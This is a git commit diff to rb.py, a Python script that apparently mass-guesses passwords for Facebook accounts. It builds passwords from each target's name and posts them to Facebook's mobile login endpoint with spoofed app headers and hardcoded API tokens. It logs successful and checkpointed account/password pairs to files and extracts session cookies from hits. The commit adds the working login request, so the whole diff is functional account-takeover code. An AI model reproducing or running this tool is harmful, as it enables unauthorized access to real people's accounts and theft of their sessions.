3903599cc968a799c0e7e94f72d5bb4cb9a7c16b
rbrahul24 <119988259+rbrahul24@users.noreply.github.com>
2023-03-05 20:07:18 +0545

    Update rb.py

--- rb.py
+++ rb.py
@@ -275,8 +275,8 @@ def method():
     print()
     
     def start(user):
-     try:
-        global loop,accounts
+      global loop,accounts
+      try:
         r = requests.Session()
         user = user.strip()
         acc, name = user.split("|")
@@ -284,45 +284,45 @@ def method():
         try:
             last = name.rsplit(" ")[1]
         except:
-           last = first
+            last = first
         pers = str(int(loop)/int(len(accounts)) * 100)[:4]
-        sys.stdout.write('\r\033[1;91m[\033[1;97mSxR-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
+        sys.stdout.write('\r\033[1;91m[\033[1;97mSxR-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
         sys.stdout.flush()
-        for pword in totalpass:              
+        for pword in totalpass:
             heads = None
+            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI":str(random.randint(20000, 40000)),"X-FB-SIM-HNI":str(random.randint(20000, 40000)),"X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
             pword = pword.replace("first", first).replace("last", last)
             pword = pword.lower()
-            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
-            response = requests.get('https://m.facebook.com/', cookies=cookies, headers=headers)
-      #      print(response.text)
+            data={"adid":'f4aece78-46a8-49df-aecf-def597c4c765',"format": "json","device_id":'9aa12656-54b7-46f1-bfa5-1e18069f7c80',"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"6628568379|c1e620fa708a1d5696fb991c1bde5662","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
+            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
             if 'session_key' in response.text:
                 okacc.append(acc)
                 print('\r\033[1;92m[\033[1;97mSAQI-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                 open('/sdcard/SAQI-OK.txt','a').write(f'{acc} • {pword}\n')
+                if 'y' in apps:
+                	check(r,coki)
                 if c=='y':
-                    try:
-                           q = json.loads(response.text)
-                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
-                           cookies = f"sb={ssbb};{ckkk}"
-                    except Exception as e:print(str(e)+' | '+response.text)
-                break
-            elif 'www.facebook.com' in response.text:
+                 try:  
+                  q = json.loads(response.text)
+                  ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
+                  ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+                  cookies = f"sb={ssbb};{ckkk}"
+                 except Exception as e:print(str(e)+' | '+response.text)
+                 print('\r\033[1;93m[\033[1;97mCookie\033[1;93m] \033[1;97m'+cookies)                
+                 break
+            elif 'checkpoint' in response.text:
                 if cpok=='n':
                      pass
                 else:
-                     print('\r\033[1;91m[\033[1;97mSAQI-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
+                     print('\r\033[1;91m[\033[1;97mSAQI-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
                 cpacc.append(acc)
                 open('/sdcard/SAQI-CP.txt','a').write(f'{acc} • {pword}\n')
                 break
             else:
                 continue
-        loop += 1
-     except Exception as e:time.sleep(10)
-   
-
-
- 
+        loop += 1    
+      except Exception as e: time.sleep(10)
+    
     def start2(user):
       global loop,accounts
       try:
